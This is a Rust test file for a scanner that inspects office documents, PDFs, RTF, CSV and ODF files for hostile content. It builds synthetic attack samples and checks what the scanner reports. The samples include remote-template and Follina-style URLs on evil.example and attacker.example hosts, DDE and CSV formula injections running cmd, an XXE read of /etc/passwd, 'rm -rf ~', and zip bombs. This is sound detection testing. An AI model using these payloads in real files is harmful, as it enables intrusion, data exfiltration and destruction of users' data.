#![allow(clippy::cast_possible_truncation, reason = "test-only PRNG arithmetic")]

//! End-to-end X-ray tests over synthetic hostile documents.

pub(crate) mod fixtures;

use arca_abi::wire::{self, DecodeLimits};
use arca_container::cfb::writer::CfbBuilder;

use self::fixtures::*;
use crate::report::{
    MacroLanguage, MetaKey, Severity, TargetClass, ThreatKind, Verdict, XRayReport,
};
use crate::{FileFormat, ScanPolicy, scan, scan_default};

fn kinds(r: &XRayReport) -> Vec<ThreatKind> {
    r.findings.iter().map(|f| f.kind).collect()
}

fn assert_has(r: &XRayReport, k: ThreatKind) {
    assert!(r.has(k), "expected {k:?}; got {:#?}", r.findings);
}

#[test]
fn benign_docx_is_clean_with_metadata() {
    let r = scan_default(&docx().build());
    assert_eq!(r.format, FileFormat::Docx);
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
    assert_eq!(r.meta(MetaKey::Author), Some("Иван Петров"));
    assert_eq!(r.meta(MetaKey::Company), Some("ООО Ромашка"));
    assert_eq!(r.meta(MetaKey::TotalEditMinutes), Some("42"));
    assert_eq!(r.sha256.len(), 64);
}

#[test]
fn vba_macros_are_extracted_and_triaged() {
    let r = scan_default(&docm_with_macro().build());
    assert_eq!(r.format, FileFormat::Docm);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
    assert_has(&r, ThreatKind::VbaMacros);
    assert_has(&r, ThreatKind::MacroAutoExec);
    assert_has(&r, ThreatKind::MacroEnabledContentType);
    let m = r.macros.iter().find(|m| m.name == "ThisDocument").expect("module extracted");
    assert_eq!(m.language, MacroLanguage::Vba);
    assert!(m.source.contains("CreateObject(\"WScript.Shell\")"));
    assert_eq!(m.auto_exec, vec!["Document_Open".to_owned()]);
    assert!(m.suspicious.contains(&"PowerShell".to_owned()));
    assert!(m.iocs.contains(&"http://198.51.100.23/stage2.exe".to_owned()));
    assert!(r.macros.iter().any(|m| m.name == "Helpers" && m.auto_exec.is_empty()));
}

#[test]
fn macro_project_hidden_in_a_docx_is_still_found() {
    let mut o = docm_with_macro();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
        ]),
    );
    let r = scan_default(&o.build());
    assert_eq!(r.format, FileFormat::Docx);
    assert_has(&r, ThreatKind::VbaMacros);
    assert_has(&r, ThreatKind::ContentTypeMismatch);
}

#[test]
fn remote_template_injection() {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        rels(&[("rId1", "attachedTemplate", "https://attacker.example/tpl.dotm", true)]),
    )
    .set(
        "word/settings.xml",
        format!(r#"<w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:attachedTemplate r:id="rId1"/></w:settings>"#),
    );
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::RemoteTemplate);
    assert_eq!(
        r.verdict,
        Verdict::ActiveContentNeutralized,
        "remote template injection is a payload loader"
    );
    assert!(r.external_refs.iter().any(|e| e.target == "https://attacker.example/tpl.dotm"
        && e.auto_load
        && e.class == TargetClass::Web));
}

#[test]
fn local_normal_dotm_is_only_a_privacy_leak() {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        rels(&[(
            "rId1",
            "attachedTemplate",
            "file:///C:\\Users\\i.petrov\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm",
            true,
        )]),
    );
    let r = scan_default(&o.build());
    assert!(!r.has(ThreatKind::RemoteTemplate));
    assert_has(&r, ThreatKind::LocalPathLeak);
    assert!(r.metadata.iter().any(|m| m.key == MetaKey::Person && m.value == "i.petrov"));
    assert_eq!(r.verdict, Verdict::Clean);
}

#[test]
fn unc_template_leaks_ntlm() {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        rels(&[("rId1", "attachedTemplate", "\\\\203.0.113.5\\share\\t.dotm", true)]),
    );
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::UncPathReference);
    assert_has(&r, ThreatKind::RemoteTemplate);
    assert!(r.metadata.iter().any(|m| m.key == MetaKey::Machine && m.value == "203.0.113.5"));
}

#[test]
fn tracking_pixel_is_a_tracker() {
    let mut o = docx();
    o.set(
        "word/_rels/document.xml.rels",
        rels(&[
            ("rId1", "settings", "settings.xml", false),
            ("rId7", "image", "https://t.example/open.gif?u=42", true),
        ]),
    );
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::ExternalImage);
    assert_eq!(r.verdict, Verdict::HiddenTrackers);
}

#[test]
fn follina_style_protocol_handler() {
    let mut o = docx();
    o.set(
        "word/_rels/document.xml.rels",
        rels(&[
            ("rId1", "settings", "settings.xml", false),
            (
                "rId9",
                "oleObject",
                "mhtml:https://evil.example/x.html!x-usc:https://evil.example/x.html",
                true,
            ),
        ]),
    );
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::DangerousProtocolUri);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
}

#[test]
fn dde_fields_split_and_obfuscated() {
    let mut o = docx();
    o.set("word/document.xml", document(&dde_body()));
    let r = scan_default(&o.build());
    let f = r.of_kind(ThreatKind::DdeField).next().expect("DDE field");
    assert_eq!(f.severity, Severity::Critical);
    assert!(f.detail.contains("cmd.exe"), "{}", f.detail);

    let mut o = docx();
    o.set("word/document.xml", document(dde_quote_body()));
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::DdeField);
}

#[test]
fn tracking_field_and_hidden_text() {
    let body = format!(
        "{}<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:instrText> INCLUDEPICTURE \"http://t.example/p.png\" \\d </w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>\
         <w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>секретная заметка</w:t></w:r><w:r><w:rPr><w:color w:val=\"FFFFFF\"/></w:rPr><w:t>белый текст</w:t></w:r></w:p>",
        para("Отчёт")
    );
    let mut o = docx();
    o.set("word/document.xml", document(&body));
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::RemoteFieldInclude);
    assert_has(&r, ThreatKind::ExternalImage);
    assert!(r.of_kind(ThreatKind::HiddenText).any(|f| f.detail.contains("секретная заметка")));
    assert!(r.of_kind(ThreatKind::InvisibleText).any(|f| f.detail.contains("белый текст")));
}

#[test]
fn revisions_people_and_equation_ole() {
    let body = "<w:p><w:ins w:id=\"1\" w:author=\"Мария\" w:date=\"2026-01-01T00:00:00Z\"><w:r><w:t>new</w:t></w:r></w:ins><w:del w:id=\"2\" w:author=\"Олег\"><w:r><w:delText>old</w:delText></w:r></w:del></w:p>\
                <w:p><w:r><w:object><v:shape id=\"s\"/><o:OLEObject Type=\"Embed\" ProgID=\"Equation.3\" ShapeID=\"s\" r:id=\"rId5\"/></w:object></w:r></w:p>";
    let mut o = docx();
    o.set("word/document.xml", document(body));
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::TrackedChanges);
    assert_has(&r, ThreatKind::ExploitableOleClass);
    assert!(r.metadata.iter().any(|m| m.key == MetaKey::Person && m.value == "Мария"));
}

#[test]
fn excel4_macros_and_very_hidden_sheets() {
    let r = scan_default(&xlsm_with_xlm().build());
    assert_eq!(r.format, FileFormat::Xlsm);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
    assert_has(&r, ThreatKind::XlmMacroSheet);
    assert_has(&r, ThreatKind::XlmAutoOpenName);
    assert_has(&r, ThreatKind::VeryHiddenSheet);
    let m = r.macros.iter().find(|m| m.language == MacroLanguage::Xlm).expect("XLM source");
    assert!(m.source.contains("A1: =EXEC(\"cmd /c calc.exe\")"), "{}", m.source);
    assert!(m.suspicious.contains(&"EXEC".to_owned()) && m.suspicious.contains(&"CALL".to_owned()));
}

#[test]
fn dde_and_webservice_formulas() {
    let sheet = r#"<row r="1"><c r="A1"><f>cmd|' /C calc'!A0</f><v>0</v></c><c r="B1"><f>_xlfn.WEBSERVICE("https://x.example/?d="&amp;A2)</f></c><c r="C1"><f>SUM(A2:A9)</f></c></row><row r="5" hidden="1"/>"#;
    let r = scan_default(&xlsx(sheet).build());
    assert_has(&r, ThreatKind::DdeFormula);
    assert!(r.of_kind(ThreatKind::DangerousFormula).any(|f| f.detail.contains("WEBSERVICE")));
    assert_has(&r, ThreatKind::HiddenRowsOrColumns);
    assert_eq!(r.of_kind(ThreatKind::DangerousFormula).count(), 1, "SUM must not be flagged");
}

#[test]
fn powerpoint_mouse_over_program_action() {
    let mut o = Opc::default();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"),
            ("/ppt/slides/slide1.xml", "application/vnd.openxmlformats-officedocument.presentationml.slide+xml"),
        ]),
    )
    .set("_rels/.rels", rels(&[("rId1", "officeDocument", "ppt/presentation.xml", false)]))
    .set("ppt/presentation.xml", r#"<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>"#)
    .set(
        "ppt/slides/slide1.xml",
        r#"<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" show="0"><p:cSld><p:spTree><p:sp><p:nvSpPr><p:cNvPr id="2" name="t"><a:hlinkHover r:id="" action="ppaction://program"/></p:cNvPr></p:nvSpPr></p:sp></p:spTree></p:cSld></p:sld>"#,
    )
    .remove("docProps/core.xml");
    let r = scan_default(&o.build());
    assert_eq!(r.format, FileFormat::Pptx);
    let f = r.of_kind(ThreatKind::ProgramAction).next().expect("program action");
    assert_eq!(f.severity, Severity::Critical);
    assert!(f.detail.contains("mouse-over"));
    assert_has(&r, ThreatKind::HiddenSlide);
}

// ---------------------------------------------------------------------------
// Structural attacks: the document must be rejected.
// ---------------------------------------------------------------------------

fn rejected_with(data: &[u8], kind: ThreatKind) {
    let r = scan_default(data);
    assert_eq!(r.verdict, Verdict::Rejected, "{:#?}", r.findings);
    assert!(r.has(kind), "expected {kind:?}; got {:?}", kinds(&r));
    assert!(!r.rejection.is_empty());
}

#[test]
fn zip_bomb_member_rejects() {
    let mut o = docx();
    o.set("word/media/bomb.xml", vec![b'A'; 30 << 20]);
    rejected_with(&o.build(), ThreatKind::CompressionBomb);
}

#[test]
fn nested_zip_bomb_rejects() {
    let mut inner = docx();
    inner.set("word/media/bomb.xml", vec![0u8; 20 << 20]);
    let mut o = docx();
    o.set("word/embeddings/Microsoft_Word_Document.docx", inner.build());
    rejected_with(&o.build(), ThreatKind::CompressionBomb);
}

#[test]
fn path_traversal_rejects() {
    // The writer refuses traversal names, so patch one in after the fact.
    let mut o = docx();
    o.set("word/xx/evil.xml", b"<a/>".to_vec());
    let mut bytes = o.build();
    let needle = b"word/xx/evil.xml";
    let replacement = b"word/../../e.xml";
    let mut i = 0;
    while let Some(p) = bytes[i..].windows(needle.len()).position(|w| w == needle) {
        let at = i + p;
        bytes[at..at + needle.len()].copy_from_slice(replacement);
        i = at + needle.len();
    }
    rejected_with(&bytes, ThreatKind::PathTraversal);
}

#[test]
fn xxe_and_billion_laughs_reject() {
    let mut o = docx();
    o.set("word/document.xml", r#"<?xml version="1.0"?><!DOCTYPE w [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document xmlns:w="urn:w">&x;</w:document>"#);
    rejected_with(&o.build(), ThreatKind::XmlEntityAttack);
    let mut o = docx();
    o.set("docProps/app.xml", r#"<!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><Properties>&b;</Properties>"#);
    rejected_with(&o.build(), ThreatKind::XmlEntityAttack);
}

#[test]
fn excessive_xml_depth_is_reported() {
    let deep = format!("{}{}", "<w:p>".repeat(70), "</w:p>".repeat(70));
    let mut o = docx();
    o.set("word/document.xml", document(&deep));
    let r = scan_default(&o.build());
    assert!(
        r.of_kind(ThreatKind::MalformedContainer).any(|f| f.detail.contains("nesting")),
        "{:#?}",
        r.findings
    );
}

#[test]
fn disguised_executables_reject() {
    let mut pe = b"MZ\x90\x00\x03\x00\x00\x00".to_vec();
    pe.resize(512, 0);
    rejected_with(&pe, ThreatKind::DisguisedExecutable);
    rejected_with(b"#!/bin/sh\nrm -rf ~\n", ThreatKind::DisguisedExecutable);
}

#[test]
fn executables_inside_packages_are_flagged() {
    let mut pe = b"MZ\x90\x00".to_vec();
    pe.resize(256, 0);
    let mut o = docx();
    o.set("word/media/image1.png", pe.clone()).set("word/embeddings/oleObject1.bin", pe);
    let r = scan_default(&o.build());
    assert!(r.of_kind(ThreatKind::EmbeddedExecutable).count() >= 2, "{:#?}", r.findings);
}

#[test]
fn broken_ole2_rejects() {
    let mut f = doc_binary();
    // Corrupt the sector size field.
    f[30] = 7;
    let r = scan_default(&f);
    assert_eq!(r.verdict, Verdict::Rejected);
    assert_has(&r, ThreatKind::MalformedContainer);
}

#[test]
fn ole2_fat_cycle_is_rejected_not_hung() {
    let mut f = doc_binary();
    let fat0 = u32::from_le_bytes(f[76..80].try_into().unwrap()) as usize;
    let first_dir = u32::from_le_bytes(f[48..52].try_into().unwrap());
    // Point the directory chain at itself.
    let off = (fat0 + 1) * 512 + first_dir as usize * 4;
    f[off..off + 4].copy_from_slice(&first_dir.to_le_bytes());
    let r = scan_default(&f);
    assert_eq!(r.verdict, Verdict::Rejected);
}

// ---------------------------------------------------------------------------
// Legacy and other formats.
// ---------------------------------------------------------------------------

#[test]
fn word_binary_with_macros_equation_and_dde() {
    let r = scan_default(&doc_binary());
    assert_eq!(r.format, FileFormat::Doc);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
    assert_has(&r, ThreatKind::VbaMacros);
    assert_has(&r, ThreatKind::MacroAutoExec);
    assert_has(&r, ThreatKind::ExploitableOleClass);
    assert_has(&r, ThreatKind::DdeField);
    assert_eq!(r.meta(MetaKey::Author), Some("Иван Петров"));
    assert_eq!(r.meta(MetaKey::TotalEditMinutes), Some("125"));
    assert!(r.macros.iter().any(|m| m.source.contains("URLDownloadToFile")));
}

#[test]
fn xls_biff_globals() {
    let mut wb = Vec::new();
    let mut rec = |t: u16, body: &[u8]| {
        wb.extend_from_slice(&t.to_le_bytes());
        wb.extend_from_slice(&u16::try_from(body.len()).unwrap().to_le_bytes());
        wb.extend_from_slice(body);
    };
    rec(0x0809, &[0x00, 0x06, 0x05, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    let sheet = |state: u8, dt: u8, name: &str| {
        let mut b = vec![0, 0, 0, 0, state, dt, u8::try_from(name.len()).unwrap(), 0];
        b.extend_from_slice(name.as_bytes());
        b
    };
    rec(0x0085, &sheet(0, 0, "Sheet1"));
    rec(0x0085, &sheet(2, 1, "Macro1"));
    let mut name = vec![0x20, 0x00, 0x00, 0x01, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0x00, 0x01];
    name.extend_from_slice(&[0; 4]);
    rec(0x0018, &name);
    rec(0x000A, &[]);
    let mut b = CfbBuilder::new();
    b.add_stream("Workbook", {
        let mut w = wb.clone();
        w.resize(5000, 0);
        w
    })
    .unwrap();
    let r = scan_default(&b.finish().unwrap());
    assert_eq!(r.format, FileFormat::Xls);
    assert_has(&r, ThreatKind::XlmMacroSheet);
    assert_has(&r, ThreatKind::VeryHiddenSheet);
    assert_has(&r, ThreatKind::XlmAutoOpenName);
}

#[test]
fn rtf_equation_exploit_is_detected() {
    let r = scan_default(&rtf_equation_exploit());
    assert_eq!(r.format, FileFormat::Rtf);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
    assert_has(&r, ThreatKind::ExploitableOleClass);
    assert_has(&r, ThreatKind::RtfAutoUpdateObject);
    assert_has(&r, ThreatKind::RtfEmbeddedObject);
}

#[test]
fn pdf_javascript_in_object_stream() {
    let r = scan_default(&pdf_with_js());
    assert_eq!(r.format, FileFormat::Pdf);
    assert_has(&r, ThreatKind::PdfJavaScript);
    assert_has(&r, ThreatKind::PdfAutoAction);
    assert!(
        r.macros
            .iter()
            .any(|m| m.language == MacroLanguage::JavaScript
                && m.source.contains("exportDataObject"))
    );
    assert_eq!(r.meta(MetaKey::Author), Some("Ivan Petrov"));
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
}

#[test]
fn csv_formula_injection() {
    let csv = "name,amount,note\nIvan,100,ok\nEve,=cmd|' /C calc'!A0,x\nBob,-5,refund\n";
    let r = scan_default(csv.as_bytes());
    assert_eq!(r.format, FileFormat::Csv);
    assert_has(&r, ThreatKind::CsvFormulaInjection);
    assert_eq!(
        r.of_kind(ThreatKind::CsvFormulaInjection).next().map(|f| f.severity),
        Some(Severity::High)
    );
}

#[test]
fn markdown_remote_images_and_html() {
    let r = scan_default(b"# Title\n\n![x](https://t.example/p.png)\n");
    assert_eq!(r.format, FileFormat::Markdown);
    assert_has(&r, ThreatKind::ExternalImage);
    let r = scan_default(b"<!DOCTYPE html><html><script>alert(1)</script></html>");
    assert_eq!(r.format, FileFormat::Html);
    assert_eq!(r.verdict, Verdict::Rejected);
}

#[test]
fn odf_basic_macro_and_metadata() {
    let mut z = arca_container::zip::writer::ZipWriter::new();
    use arca_container::zip::writer::Compression::{Deflated, Stored};
    z.add("mimetype", b"application/vnd.oasis.opendocument.text", Stored).unwrap();
    z.add("META-INF/manifest.xml", br#"<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/></manifest:manifest>"#, Deflated).unwrap();
    z.add("content.xml", br#"<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/></office:event-listeners></office:scripts><office:body><draw:image xlink:href="http://t.example/px.png"/></office:body></office:document-content>"#, Deflated).unwrap();
    z.add("meta.xml", "<office:document-meta xmlns:office=\"urn:oasis:names:tc:opendocument:xmlns:office:1.0\" xmlns:meta=\"urn:oasis:names:tc:opendocument:xmlns:meta:1.0\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><office:meta><meta:initial-creator>Пётр</meta:initial-creator><meta:editing-duration>PT2H5M</meta:editing-duration><meta:generator>LibreOffice/25.8</meta:generator></office:meta></office:document-meta>".as_bytes(), Deflated).unwrap();
    z.add("Basic/Standard/Module1.xml", br#"<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub Main
  Shell("cmd /c calc")
End Sub</script:module>"#, Deflated).unwrap();
    let r = scan_default(&z.finish().unwrap());
    assert_eq!(r.format, FileFormat::Odt);
    assert_has(&r, ThreatKind::StarBasicMacros);
    assert_has(&r, ThreatKind::OdfEventScript);
    assert_has(&r, ThreatKind::ExternalImage);
    assert_eq!(r.meta(MetaKey::Author), Some("Пётр"));
    assert_eq!(r.meta(MetaKey::TotalEditMinutes), Some("125"));
    assert!(
        r.macros.iter().any(|m| m.language == MacroLanguage::StarBasic
            && m.suspicious.contains(&"Shell".to_owned()))
    );
}

#[test]
fn embedded_document_is_scanned_recursively() {
    let inner = docm_with_macro().build();
    let mut o = docx();
    o.set("word/embeddings/Microsoft_Word_Document1.docm", inner);
    let r = scan_default(&o.build());
    assert_has(&r, ThreatKind::EmbeddedDocument);
    assert_has(&r, ThreatKind::VbaMacros);
    assert!(r.macros.iter().any(|m| m.location.starts_with("word/embeddings/")));
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
}

#[test]
fn nesting_limit_is_enforced() {
    let mut doc = docx().build();
    for _ in 0..5 {
        let mut o = docx();
        o.set("word/embeddings/inner.docx", doc);
        doc = o.build();
    }
    let r = scan_default(&doc);
    assert_has(&r, ThreatKind::ScanLimitReached);
}

#[test]
fn polyglot_pdf_zip() {
    let mut pdf = pdf_with_js();
    pdf.extend_from_slice(&docx().build());
    let r = scan_default(&pdf);
    assert_has(&r, ThreatKind::PolyglotFile);
}

#[test]
fn oversized_input_is_rejected() {
    let policy = ScanPolicy { max_input_bytes: 100, ..ScanPolicy::default() };
    let r = scan(&[0u8; 200], &policy);
    assert_eq!(r.verdict, Verdict::Rejected);
}

#[test]
fn report_survives_the_wire() {
    for data in [
        docm_with_macro().build(),
        xlsm_with_xlm().build(),
        doc_binary(),
        pdf_with_js(),
        rtf_equation_exploit(),
    ] {
        let r = scan_default(&data);
        let bytes = wire::to_bytes(&r).unwrap();
        let back: XRayReport = wire::from_bytes(&bytes, DecodeLimits::default()).unwrap();
        assert_eq!(back, r);
    }
}

#[test]
fn mutation_fuzz_never_panics() {
    let seeds = [
        docm_with_macro().build(),
        xlsm_with_xlm().build(),
        doc_binary(),
        rtf_equation_exploit(),
        pdf_with_js(),
    ];
    let mut state = 0x9E37_79B9_7F4A_7C15u64;
    let mut next = || {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        state
    };
    for seed in &seeds {
        for _ in 0..150 {
            let mut m = seed.clone();
            let flips = 1 + (next() % 8) as usize;
            for _ in 0..flips {
                let i = (next() % m.len() as u64) as usize;
                m[i] = m[i].wrapping_add(1 + (next() % 255) as u8);
            }
            if next() % 4 == 0 {
                let cut = (next() % m.len() as u64) as usize;
                m.truncate(cut);
            }
            let _ = scan_default(&m);
        }
    }
}

/// Writes the synthetic samples to `$ARCA_DUMP_DIR` (if set) so they can be
/// cross-checked with independent tools (LibreOffice, olevba, pdfid ...).
#[test]
fn dump_fixtures_for_external_validation() {
    let Some(dir) = std::env::var_os("ARCA_DUMP_DIR") else { return };
    let dir = std::path::PathBuf::from(dir);
    std::fs::create_dir_all(&dir).unwrap();
    let samples = [
        ("benign.docx", docx().build()),
        ("macro.docm", docm_with_macro().build()),
        ("xlm.xlsm", xlsm_with_xlm().build()),
        ("formulas.xlsx", xlsx(r#"<row r="1"><c r="A1"><f>cmd|' /C calc'!A0</f><v>0</v></c><c r="B1"><f>SUM(1,2)</f><v>3</v></c></row>"#).build()),
        ("legacy.doc", doc_binary()),
        ("exploit.rtf", rtf_equation_exploit()),
        ("js.pdf", pdf_with_js()),
    ];
    for (name, data) in samples {
        std::fs::write(dir.join(name), data).unwrap();
    }
}
